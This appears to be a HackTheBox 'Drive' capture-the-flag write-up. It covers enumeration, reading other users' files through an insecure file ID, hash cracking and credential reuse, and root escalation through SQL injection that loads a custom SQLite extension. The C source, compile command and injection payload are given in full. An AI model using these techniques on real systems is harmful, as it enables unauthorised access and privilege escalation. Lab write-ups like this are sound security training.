---
title: HackTheBox - Drive
date: 2023-10-24 13:22:54
tags: [htb, drive, ctf, writeup, gobuster, web, burpe, hashcat, sqlite3, nmap, curl, sqli, ghidra, linux]
category: ctf
description: ctf writeup for htb drive
---

## Getting User

### Nmap

SYN Scan

{% vimhl bash %}
┌──(kali㉿kali)-[~/HTB/Drive]
└─$ sudo nmap -sS -oA nmap/initial_scan 10.129.51.71
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-16 09:36 EDT
Nmap scan report for 10.129.51.71
Host is up (0.42s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp
Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds
{% endvimhl %}

<br>
Default script scan

{% vimhl bash %}
└─$ sudo nmap -sC -sV -oA nmap/default_script_scan 10.129.51.71
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-16 09:37 EDT
Nmap scan report for 10.129.51.71
Host is up (0.42s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)
|   256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)
|_  256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://drive.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.57 seconds
{% endvimhl %}

<br>
The scan shows that port 80 redirects to http://drive.htb/. I'm going to add that to /etc/hosts to be able to access the website.

{% vimhl bash %}
┌──(kali㉿kali)-[~]
└─$ sudo vim /etc/hosts

┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.51.71    drive.htb
{% endvimhl %}

<br>

### Foothold

I'm going to use gobuster to enumerate the website directories.

{% vimhl bash %}
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/big.txt -u drive.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://drive.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 301) [Size: 0] [--> /contact/]
/favicon.ico          (Status: 200) [Size: 2348]
/home                 (Status: 301) [Size: 0] [--> /home/]
/login                (Status: 301) [Size: 0] [--> /login/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
{% endvimhl %}

Didn't find anything useful there.
<br>

Going through the website, I found the URL **drive.htb/{file_id}/block** when clicking to reserve a file on the home page of the dashboard. This allows me to read other users' files.

Using Burpe, by intercepting the page and sending it to intruder, I found a file with the ID of 79 that contains sensitive information.

```
martin
Xk4@KjyrYv8t194L!
```

We also found the file **-/101/block** which tells us that there are backups at **/var/www/backups/** and they are password protected.

<br>
I found a couple of archived backups that ask for a password when attempting to extract and a db file that has sha1 encrypted passwords.

{% vimhl bash %}
martin@drive:~$ cd /var/www/backups
martin@drive:/var/www/backups$ ls
1_Dec_db_backup.sqlite3.7z  1_Nov_db_backup.sqlite3.7z  1_Oct_db_backup.sqlite3.7z  1_Sep_db_backup.sqlite3.7z  db.sqlite3
martin@drive:/var/www/backups$ 7z e 1_Dec_db_backup.sqlite3.7z 
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7302P 16-Core Processor                (830F10),ASM,AES-NI)
Scanning the drive for archives:
1 file, 13018 bytes (13 KiB)
Extracting archive: 1_Dec_db_backup.sqlite3.7z
--
Path = 1_Dec_db_backup.sqlite3.7z
Type = 7z
Physical Size = 13018
Headers Size = 170
Method = LZMA2:22 7zAES
Solid = -
Blocks = 1
    
Enter password (will not be echoed):
ERROR: Data Error in encrypted file. Wrong password? : DoodleGrive/db.sqlite3
                             
Sub items Errors: 1
Archives with Errors: 1
Sub items Errors: 1
{% endvimhl %}

<br>
Let's see what the unprotected db contains.

{% vimhl bash %}
martin@drive:/var/www/backups$ sqlite3 db.sqlite3 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
accounts_customuser                   auth_permission                     
accounts_customuser_groups            django_admin_log                    
accounts_customuser_user_permissions  django_content_type                 
accounts_g                            django_migrations                   
accounts_g_users                      django_session                      
auth_group                            myApp_file                          
auth_group_permissions                myApp_file_groups                   
sqlite> select password from accounts_customuser
   ...> ;
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
{% endvimhl %}

<br>

I added the hashes to a file and used hashcat to decrypt the hashes, which gave us one result, for the user **tom**.

{% vimhl bash %}
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385
sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004:john316
{% endvimhl %}

Currently I haven't found anything I could do with this password.

<br>
In our nmap scan, we saw that port 3000 was running.

{% vimhl bash %}
martin@drive:~$ curl http://localhost:3000
{% endvimhl %}

<br>
Seeing its a local git hosting web app, I went digging in the source code. 

After some time, I was able to login and access the DoodleGrive repo to see the back up script and get the backups password using the following steps.

{% vimhl bash %}
martin@drive:~$ curl http://localhost:3000/explore/users

martin@drive:~$ curl http://localhost:3000/user/login

martin@drive:~$ curl -s -L --cookie-jar cookies.txt -D headers.txt -d "user_name=martinCruz&password=Xk4@KjyrYv8t194L!" http://localhost:3000/user/login

martin@drive:~$ curl --cookie cookies.txt http://localhost:3000/crisDisel

martin@drive:~$ curl --cookie cookies.txt http://localhost:3000/crisDisel/DoodleGrive

martin@drive:~$ curl --cookie cookies.txt http://localhost:3000/crisDisel/DoodleGrive/src/branch/main/db_backup.sh

martin@drive:~$ curl --cookie cookies.txt http://localhost:3000/crisDisel/DoodleGrive/raw/branch/main/db_backup.sh
{% endvimhl %}

{% vimhl bash %}
martin@drive:~$ curl --cookie cookies.txt http://localhost:3000/crisDisel/DoodleGrive/raw/branch/main/db_backup.sh
#!/bin/bash
DB=$1
date_str=$(date +'%d_%b')
7z a -p'H@ckThisP@ssW0rDIfY0uC@n:)' /var/www/backups/${date_str}_db_backup.sqlite3.7z db.sqlite3
cd /var/www/backups/
ls -l --sort=t *.7z > backups_num.tmp
backups_num=$(cat backups_num.tmp | wc -l)
if [[ $backups_num -gt 10 ]]; then
      #backups is more than 10... deleting to oldest backup
      rm $(ls  *.7z --sort=t --color=never | tail -1)
      #oldest backup deleted successfully!
fi
rm backups_num.tmp
{% endvimhl %}

<br>

After getting **tom's** encrypted passwords and decrypting them from Sep to Dec we get the following plain passwords.

{% vimhl bash %}
sha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93:john boy
sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141:johniscool
sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7
{% endvimhl %}

<br>
We see a password pattern now which we'll need to use to crack dec which has different encryption

{% vimhl bash %}
martin@drive:/home$ cd /home/martin
martin@drive:~$ sqlite3 db.sqlite3

sqlite> select * from accounts_customuser
   ...> ;
16|pbkdf2_sha256$390000$ZjZj164ssfwWg7UcR8q4kZ$KKbWkEQCpLzYd82QUBq65aA9j3+IkHI6KK9Ue8nZeFU=|2022-12-26 06:21:34.294890|1|admin|||admin@drive.htb|1|1|2022-12-08 14:59:02.802351
21|pbkdf2_sha256$390000$npEvp7CFtZzEEVp9lqDJOO$So15//tmwvM9lEtQshaDv+mFMESNQKIKJ8vj/dP4WIo=|2022-12-24 22:39:42.847497|0|jamesMason|||jamesMason@drive.htb|0|1|2022-12-23 12:33:04.637591
22|pbkdf2_sha256$390000$GRpDkOskh4irD53lwQmfAY$klDWUZ9G6k4KK4VJUdXqlHrSaWlRLOqxEvipIpI5NDM=|2022-12-24 12:55:10.152415|0|martinCruz|||martin@drive.htb|0|1|2022-12-23 12:35:02.230289
23|pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$B98WdQOfutEZ8lHUcGeo3nR326QCQjwZ9lKhfk9gtro=|2022-12-26 06:20:23.299662|0|tomHands|||tom@drive.htb|0|1|2022-12-23 12:37:45
24|pbkdf2_sha256$390000$TBrOKpDIumk7FP0m0FosWa$t2wHR09YbXbB0pKzIVIn9Y3jlI3pzH0/jjXK0RDcP6U=|2022-12-24 16:51:53.717055|0|crisDisel|||cris@drive.htb|0|1|2022-12-23 12:39:15.072407
sqlite>
{% endvimhl %}

<br>
Ffter filtering the wordlists with the previous passwords we found, we are able to crack it

```
pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$B98WdQOfutEZ8lHUcGeo3nR326QCQjwZ9lKhfk9gtro=:johnmayer7
```

<br>
we can now SSH with tom's credentials, and get the user flag.

{% vimhl bash %}
┌──(kali㉿kali)-[~]
└─$ ssh tom@10.129.51.203
. . . . . . . . . .
tom@drive:~$
{% endvimhl %}

<br>

## Getting Root

### Information Gathering

we found a README.txt in our home folder as well as an executable which is mentioned in the txt file

{% vimhl bash %}
tom@drive:~$ cat README.txt 
Hi team
after the great success of DoodleGrive, we are planning now to start working on our new project: "DoodleGrive self hosted",it will allow our customers to deploy their own documents sharing platform privately on thier servers...
However in addition with the "new self Hosted release" there should be a tool(doodleGrive-cli) to help the IT team in monitoring server status and fix errors that may happen.
As we mentioned in the last meeting the tool still in the development phase and we should test it properly...
We sent the username and the password in the email for every user to help us in testing the tool and make it better.
If you face any problem, please report it to the development team.
Best regards.
{% endvimhl %}

<br>

Using **ghidra** to deassemble doodleGrive-cli, we found the username and password to login and an activate user account function which is vulnerable to SQLi

```
moriarty 
findMeIfY0uC@nMr.Holmz!
```

<br>

and we found an **activate_user_account** function that's vulnerable to SQLi

{% vimhl bash %}
void activate_user_account(void)
{
  size_t sVar1;
  long in_FS_OFFSET;
  char local_148 [48];
  char local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter username to activate account: ");
  fgets(local_148,0x28,(FILE *)stdin);
  sVar1 = strcspn(local_148,"\n");
  local_148[sVar1] = '\0';
  if (local_148[0] == '\0') {
    puts("Error: Username cannot be empty.");
  }
  else {
    sanitize_string(local_148);
    snprintf(local_118,0xfa,
             "/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \'UPDATE accounts_customuser SE T is_active=1 WHERE username=\"%s\";\'"
             ,local_148);
    printf("Activating account for user \'%s\'...\n",local_148);
    system(local_118);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
{% endvimhl %}

<br>

### Privilege Escalation

This  extension will copy root.txt from root folder to tom's home folder
**exploit.c**
{% vimhl bash %}
#include <sqlite3ext.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
SQLITE_EXTENSION_INIT1
int sqlite3_extension_init(sqlite3 *db) {
  char *inputFile = "/root/root.txt";  
  char *outputFile = "/home/tom/root";
  char buffer[1024];
  ssize_t bytesRead;
  int inFd = open(inputFile, O_RDONLY);
  int outFd = open(outputFile, O_WRONLY | O_CREAT | O_APPEND, S_IRUSR | S_IWUSR);
  while ((bytesRead = read(inFd, buffer, sizeof(buffer))) > 0) {
    write(outFd, buffer, bytesRead);
  }
  close(inFd);
  close(outFd);
  chmod(outputFile, S_IRWXU | S_IRWXG | S_IRWXO);
  return SQLITE_OK;
}
{% endvimhl %}

<br>

compile the extension
{% vimhl bash %}
gcc -shared -fPIC -o C.so exploit.c
{% endvimhl %}

<br>

SQLi to load the extension.
```
"+load_extension(char(46,47,67))--;
```

<br>

Run doodleGrive and activate a user account to load the extension.
{% vimhl bash %}
doodleGrive cli beta-2.2: 
1. Show users list and info
2. Show groups list
3. Check server health and status
4. Show server requests log (last 1000 request)
5. activate user account
6. Exit
Select option: 5
Enter username to activate account: "+load_extension(char(46,47,67))--;
Activating account for user '"+load_extension(char(46,47,67))--'...
doodleGrive cli beta-2.2: 
1. Show users list and info
2. Show groups list
3. Check server health and status
4. Show server requests log (last 1000 request)
5. activate user account
6. Exit
Select option: 6
exiting...
tom@drive:~$ ls
C.so  doodleGrive-cli  root  README.txt  user.txt
tom@drive:~$ cat root
e733d1837fd94b33d3d3df7defd*****
{% endvimhl %}